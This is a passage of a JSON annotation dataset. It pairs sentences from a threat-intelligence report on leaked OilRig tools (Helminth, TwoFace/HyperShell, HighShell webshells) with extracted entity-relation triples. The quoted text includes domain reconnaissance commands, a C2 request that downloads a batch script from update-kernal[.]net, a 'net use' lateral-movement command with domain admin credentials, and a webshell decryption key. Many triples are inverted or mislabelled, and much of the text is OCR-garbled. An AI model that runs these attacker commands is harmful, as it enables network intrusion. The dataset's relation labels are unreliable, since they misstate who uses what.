+      "context": "The data dump included the 0000000000.bat fi le, which when executed on an infected system would run the following commands to gather information to be sent back to the C2 server: whoami hostname ipconfig /all net user /domain net group /domain net group \"domain admins\" /domain net group \"Exchange Trusted Subsystem\" /domain",
+      "triple": [
+        {
+          "subject": {
+            "name": "0000000000.bat file",
+            "type": "Filepath"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "commands",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "which when executed on an infected system would run the following commands"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The following HTTP request from the Helminth backdoor (SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c ) downloaded the similar batch script: GET /update-index.aspx?req=1786873725%5Cbat&m=d HTTP/1.1 Host: update-kernal[.]net Connection: Keep-Alive We performed a code comparison to visualize the similarities between the batch script delivered as the default command in Poison Frog is to the script provided to the Helminth backdoor.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Helminth",
+            "type": "Backdoor"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c",
+            "type": "SHA-256"
+          },
+          "evidence": {
+            "quote": "SHA256: 1fb69090be8a2e11eeb220b26ee5eddf1e3fe81ffa59c47d47d01bf90c2b080c"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "017",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "2261 echo RDP echo Task reg query HKEY_CURRENT_USERI SoftwarelMicrosoftlTerminal Server ClientlDefault\" schtasks /query",
+      "triple": [
+        {
+          "subject": {
+            "name": "2261",
+            "type": "Unknown"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "echo RDP echo Task reg query HKEY_CURRENT_USERI SoftwarelMicrosoftlTerminal Server ClientlDefault\" schtasks /query",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "evidence": {
+            "quote": "2261 echo RDP echo Task reg query HKEY_CURRENT_USERI SoftwarelMicrosoftlTerminal Server ClientlDefault\" schtasks /query"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "023",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "echo Task echo schtasks Iquery /FO List FTN \"GoogleUpdatesTaskMachineUI\" findstr /b /n",
+      "triple": [
+        {
+          "subject": {
+            "name": "echo",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "schtasks",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "echo Task echo schtasks Iquery /FO List FTN"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "027",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Every echo AntiVirus INode: localhost Path AntiVirusProduct Get displayName",
+      "triple": [
+        {
+          "subject": {
+            "name": "Every echo AntiVirus INode",
+            "type": "System"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "displayName",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": "has displayName"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 9,
+        "id": "029",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The data dump included several di ff erent webshells apparently used by OilRig to interact with compromised servers.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshells",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "apparently used by OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 10,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In addition to the actual webshells in use by OilRig, the data dump includes lists of existing deployments of webshells hosted on compromised websites.",
+      "triple": [
+        {
+          "subject": {
+            "name": "OilRig",
+            "type": "ThreatActor"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "webshells",
+            "type": "Webshell"
+          },
+          "evidence": {
+            "quote": "In addition to the actual webshells in use by OilRig"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 10,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " Hypershell The HyperShell webshell included in the data dump (SHA256: e483eee77fcc5ef11d5bf33a4179312753b62ec9a247dd14528cc797e7632d99 ) is an example of the 3DES variant of the TwoFace loader that we called TwoFace++ in as we reported in July 2017.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Hypershell",
+            "type": "Webshell"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "TwoFace++",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "that we called TwoFace++"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "During our initial research into the TwoFace++ loader, we were unable to extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples.",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace++ loader",
+            "type": "Malware"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "embedded payload",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "extract the embedded payload using the same brute forcing technique that we used on the initial TwoFace loader samples."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Unlike the initial TwoFace loader, the TwoFace++ loader used the 3DES cipher and a SHA256 hash of a string provided by the actor and used as a key, so we were unable to extract the embedded webshells as we were unable to determine the actor provided key.",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace++ loader",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "3DES cipher",
+            "type": "Protocol"
+          },
+          "evidence": {
+            "quote": "the TwoFace++ loader used the 3DES cipher"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "However, the HyperShell sample in this dump provided the necessary information to determine the actor-provided key needed to decrypt its embedded webshell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HyperShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "evidence": {
+            "quote": "the HyperShell sample in this dump provided the necessary information to determine the actor-provided key needed to decrypt its embedded webshell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The pre tags within the HyperShell sample are: <pre><%= Server.HtmlEncode(\"NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a\") %></pre> Figure 9 shows HyperShell displaying the content within the \"pre\" tags within the browser.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HyperShell",
+            "type": "Application"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "<pre><%= Server.HtmlEncode(\"NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a\") %></pre>",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "The pre tags within the HyperShell sample are:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The resulting string of NxKK<TjWN^lv-$*UZ|Z- H;cGL(O>7aaqB2nU65TgFoEfdVqiAddBQLInc9 has a SHA1 hash of 9d3ff106fbc3508b8453c7d6f285543d0b9c2721 , which is base64 encoded to nT/xBvvDUIuEU8fW8oVUPQucJyE= .",
+      "triple": [
+        {
+          "subject": {
+            "name": "NxKK<TjWN^lv-$*UZ|Z- H;cGL(O>7aaqB2nU65TgFoEfdVqiAddBQLInc9",
+            "type": "Filename"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "9d3ff106fbc3508b8453c7d6f285543d0b9c2721",
+            "type": "SHA-1"
+          },
+          "evidence": {
+            "quote": "has a SHA1 hash of 9d3ff106fbc3508b8453c7d6f285543d0b9c2721"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Once authenticated, the TwoFace++ loader uses the password to decrypt the embedded webshell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace++ loader",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "password",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "the TwoFace++ loader uses the password"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "To use the password as a key for 3DES, TwoFace++ will generate the SHA256 password of the NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a string that results in a hash of 11f66b55f3d24303621e5ef9565b02a576cc58bc5f8789cae96c3d400064b90e .",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace++",
+            "type": "Software"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "SHA256",
+            "type": "Hash"
+          },
+          "evidence": {
+            "quote": "will generate the SHA256 password of the NxKK<TjWN^lv-$*UZ|Z-H;cGL(O>7a string"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Geographic location of webshells of impacted organizations",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshells",
+            "type": "Webshell"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "Geographic location",
+            "type": "Location"
+          },
+          "evidence": {
+            "quote": "Geographic location of webshells"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 11,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "This resulting webshell also appears to be a variant of HighShell, speci fi cally version v5.0.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "HighShell",
+            "type": "Software"
+          },
+          "evidence": {
+            "quote": "This resulting webshell also appears to be a variant of HighShell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Animation showing the di ff erences between the HighShell v5.0 and TwoFace payload Not secure Address Current C:linetpub Use Reser Form v5.0 Login Do it Process cmd exe Command Command Execute File name Choose File No file chosen Upload Save as Is virtual New File name Upload Download File name Download Upload Base64 File Is virtual Base64 File Path and Name Upload Standard Connection Trusted Connectin Sample Sq]",
+      "triple": [
+        {
+          "subject": {
+            "name": "Animation",
+            "type": "Unknown"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "differences",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "Animation showing the di ff erences between the HighShell v5.0 and TwoFace payload"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The most notable di ff erence is that the HighShell v5.0 webshell includes a salt value it applies to the actor provided password that it uses for authentication.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v5.0",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "salt value",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "that it uses for authentication."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Figure 11 shows the code comparison between the TwoFace payload on the left (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f ) and HighShell v5.0 on the right (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619 ).",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace payload",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f",
+            "type": "SHA-256"
+          },
+          "evidence": {
+            "quote": "TwoFace payload (SHA256: 54c8bfa0be1d1419bf0770d49e937b284b52df212df19551576f73653a7d061f"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "009",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The code comparison speci fi cally shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq , which is not present within the TwoFace code on the left.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "di2zag7wZHTK9YR0NGq",
+            "type": "Hash"
+          },
+          "evidence": {
+            "quote": "including a salt variable containing di2zag7wZHTK9YR0NGq"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Comparison between HighShell v5.0 and TwoFace payload 54c8bfaObeld1419bf0770d490937b284b52df212df19551576f73653a7d061f JUse d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e9Occa0a685d307619.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v5.0",
+            "type": "MalwareFamily"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "TwoFace payload 54c8bfaObeld1419bf0770d490937b284b52df212df19551576f73653a7d061f JUse d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e9Occa0a685d307619",
+            "type": "MalwareFamily"
+          },
+          "evidence": {
+            "quote": "Comparison between HighShell v5.0 and TwoFace payload"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 12,
+        "id": "012",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The data dump also included a webshell named HighShell, which we discovered was dropped by HyperShell as discussed in the previous section.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Webshell"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "HyperShell",
+            "type": "Webshell"
+          },
+          "evidence": {
+            "quote": "named HighShell, which we discovered was dropped by HyperShell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The dump included many di ff erent HighShell samples, of which we have identi fi ed at least three di ff erent versions, seen in Table 4.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "versions",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "many di ff erent HighShell samples, of which we have identi fi ed at least three di ff erent versions"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Three HighShell webshells within data leak that speci fi ed their version Filename Ver sion error4.asp x v5.0 HighShell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Webshell"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "error4.asp x",
+            "type": "Filename"
+          },
+          "evidence": {
+            "quote": " HighShell webshells within data leak that speci fi ed their version Filename Ver sion error4.asp x v5.0 HighShell."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "005",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "aspx v7.1 HighShellL ocal.aspx 8.6. 2 SHA256 fe9cdef3c88f83b74512ec6400b7231d7295bda780 79b116627c4bc9b7a373e0 22c4023c8daa57434ef79b838e601d9d72833fec3 63340536396fe7d08ee2017 691801e3583991a92a2ad7dfa8a85396a97acdf8a0 054f3ed ff d94fc1ad58948",
+      "triple": [
+        {
+          "subject": {
+            "name": "aspx v7.1",
+            "type": "Software"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "HighShellL ocal.aspx",
+            "type": "DomainName"
+          },
+          "evidence": {
+            "quote": "aspx v7.1 HighShellL ocal.aspx"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "For instance, the HighShell webshell (SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619 ) extracted from HyperShell in the prior section showed a version number of 'v5.0', which is obviously di ff erent than the 'v5.0' HighShell with a fi lename of error4.aspx seen in Figure 12.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell webshell",
+            "type": "Webshell"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619",
+            "type": "SHA-256"
+          },
+          "evidence": {
+            "quote": "SHA256: d2b835b102117e327fdc4905ead24d45f46e82dd5ae525e90cca0a685d307619"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "HighShell v5.0 with a new color scheme and explorer tab C Not secure Main ExpIorer Address Current C:linetpub Use Reset Form v5 Login",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v5.0",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "a new color scheme and explorer tab",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "HighShell v5.0 with a new color scheme and explorer tab"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Query Run File name Get Change Creation From This File Set Time New Time Set path 'ing Figure 12 shows a second HighShell v5.0 sample with a di ff erent color scheme used for its user interface; however, a majority of the functionality is the same as the other v5.0 sample extracted from HyperShell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v5.0",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "evidence": {
+            "quote": "HighShell v5.0 sample with a di ff erent color scheme used for its user interface; however, a majority of the functionality is the same as the other v5.0 sample extracted from HyperShell."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "013",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The main tab contains the same functionality as the TwoFace payload and the other v5.0 HighShell sample.",
+      "triple": [
+        {
+          "subject": {
+            "name": "TwoFace",
+            "type": "Malware"
+          },
+          "predicate": "hasVulnerability",
+          "object": {
+            "name": "same functionality",
+            "type": "AttackPattern_LargeDescription"
+          },
+          "evidence": {
+            "quote": "same functionality as the TwoFace payload"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 13,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "HighShell v5.0 explorer tab allows actor to navigate the fi le system Not secure Main ExpIorer lorer Address Explore Location Users Publicl Size Desktop Documents Favorites Libraries Music Pictures Videos 174 desktop.ini Exp",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v5.0",
+            "type": "Software"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "explorer tab",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "HighShell v5.0 explorer tab"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 14,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, speci fi cally 'Command', 'Explorer', 'Upload', 'Download', 'Sql Server' and 'Change Time'.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell v7.1 variant",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "similar functionality",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 14,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "In addition to the change in architecture, this version of HighShell has an enhanced interface as well.",
+      "triple": [
+        {
+          "subject": {
+            "name": "this version of HighShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "an enhanced interface",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "this version of HighShell has an enhanced interface"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 14,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Modules nbt 1 Domain Admin Usemname Target Computer Localhost Clear Command Explorer Network Downloader Upload Download Change Time Append 2281 2>&1 iis apppoolldefaultapppool The 8.6.2 version of HighShell shares signi fi cant functionality with its predecessors, but also contains several new and interesting functionalities as well.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Software"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "8.6.2 version",
+            "type": "Time"
+          },
+          "evidence": {
+            "quote": "The 8.6.2 version of HighShell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The interesting features of this version of HighShell includes several executable modules, a network downloader functionality, and a spy check feature.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "executable modules",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "several executable modules"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Table 5 shows the modules provided with this variant of HighShell.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "modules",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "shows the modules provided with this variant of HighShell."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "006",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The webshell will use the 7za module to archive fi les from the Explorer tab, while the nbtscan module allows the webshell to scan the network for systems to build an IP list of system it can interact with.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "7za module",
+            "type": "Application"
+          },
+          "evidence": {
+            "quote": "The webshell will use the 7za module"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "007",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We were unable to determine how the webshell would use the remote execute module, as the webshell does not actually seem to use it.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "remote execute module",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "use the remote execute module"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "008",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "Modules included with HighShell v8.6.2 SHA256 Description dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229 7-Zip 17.01 beta c9d5dc956841e000bfd8762e2f0b48b66c79b79500e894b4efa7fb9ba17e4e9e nbtscan 1.0.35 a6a0fbfee08367046d3d26fb4b4cf7779f7fb6eaf7e60e1d9b6bf31c5be5b63e IntelliAdmin Remote Execute v1.0 Filename 7za.exe nbt.exe rx.exe Spy Check",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "SHA256 Description dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229",
+            "type": "SHA-256"
+          },
+          "evidence": {
+            "quote": "Modules included with HighShell v8.6.2 SHA256 Description dd6d7af00ef4ca89a319a230cdd094275c3a1d365807fe5b34133324bdaa0229"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "010",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We believe this functionality was meant to notify the actor in the event that they were using an altered HighShell front end webshell, possibly to avoid using the webshell if it had been detected and modi fi ed by a third-party.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Functionality",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "actor",
+            "type": "ThreatActor"
+          },
+          "evidence": {
+            "quote": "We believe this functionality was meant to notify the actor"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "014",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "We are speculating this is the intended function because the Spy Check function begins by reading the .aspx fi le of the HighShell front end (HighShellLocal.aspx in this case).",
+      "triple": [
+        {
+          "subject": {
+            "name": "Spy Check",
+            "type": "AttackPattern_SmallDescription"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": ".aspx file",
+            "type": "Filepath"
+          },
+          "evidence": {
+            "quote": "reading the .aspx fi le"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "015",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The Spy Check then generates the SHA256 hash of the HighShell front end and compares it with a hardcoded SHA256 of f35e566e28be5b3257670be6e125eb90814b9cb27df997090cea0b7a22fbd75c to determine if the webshell had been modi fi ed.",
+      "triple": [
+        {
+          "subject": {
+            "name": "Spy Check",
+            "type": "VirusScanner"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "SHA256 hash of the HighShell front end",
+            "type": "Hash"
+          },
+          "evidence": {
+            "quote": "The Spy Check then generates the SHA256 hash of the HighShell front end"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "016",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "If the hashes do not match, the webshell will display a red box with spy icon, as seen in Figure 15, or a green box with a heart icon if it matches.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "spy icon",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "display a red box with spy icon"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "017",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "All known samples display the red box with a spy icon, suggesting that the developer of HighShell did not update this functionality during development e ff orts or that the samples have been modi fi ed in some way.",
+      "triple": [
+        {
+          "subject": {
+            "name": "HighShell",
+            "type": "Malware"
+          },
+          "predicate": "hasAlias",
+          "object": {
+            "name": "red box with a spy icon",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "display the red box with a spy icon, suggesting that the developer of HighShell did not update this functionality during development e ff orts or that the samples have been modi fi ed in some way."
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "018",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "To use this functionality, the actor must provide information within the \"Target Computer\" portion of the webshell, speci fi cally a network administrator username and password, as well as a list of IP addresses of remote systems added in the \"Select Computer\" drop down.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "Target Computer",
+            "type": "System"
+          },
+          "evidence": {
+            "quote": "within the \"Target Computer\" portion of the webshell"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 15,
+        "id": "020",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": " that the webshell is running on to determine if it has more than 30 GB of free space.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "has",
+          "object": {
+            "name": "more than 30 GB of free space",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "determine if it has more than 30 GB of free space"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "000",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "If the server has less than 30 GB of free space the webshell will not perform the activity, which indicates that the developer of the webshell expects a high volume of data downloaded from the victim network.",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "indicates",
+          "object": {
+            "name": "high volume of data downloaded from the victim network",
+            "type": "Unknown"
+          },
+          "evidence": {
+            "quote": "which indicates that the developer of the webshell expects a high volume of data downloaded from the victim network"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "001",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "The webshell will iterate through the IP list and perform a series of commands for each IP, starting o ff with using the following command to connect to the remote system: net use [IP address] /user:[domain admin username] [domain admin password] 2>&1",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "IP list",
+            "type": "IPAddress"
+          },
+          "evidence": {
+            "quote": "The webshell will iterate through the IP list"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "002",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "After connecting to the remote system with net use , the webshell will run the following command to obtain a list of user folders: dir /b",
+      "triple": [
+        {
+          "subject": {
+            "name": "webshell",
+            "type": "Webshell"
+          },
+          "predicate": "uses",
+          "object": {
+            "name": "net use",
+            "type": "CommandAndControl"
+          },
+          "evidence": {
+            "quote": "After connecting to the remote system with net use ,"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "003",
+        "source": "TEXT"
+      }
+    },
+    {
+      "context": "[IP address]\\c$\\Users 2>&1 With a list of user folders, the webshell will iterate through the list of users and enumerate all of the fi les in the following folders:",
+      "triple": [
+        {
+          "subject": {
+            "name": "[IP address]",
+            "type": "IPAddress"
+          },
+          "predicate": "targets",
+          "object": {
+            "name": "users",
+            "type": "Person"
+          },
+          "evidence": {
+            "quote": "With a list of user folders, the webshell will iterate through the list of users and enumerate all of the fi les in the following folders:"
+          }
+        }
+      ],
+      "metadata": {
+        "page_number": 16,
+        "id": "004",
+        "source": "TEXT"
+      }
+    },
+    {
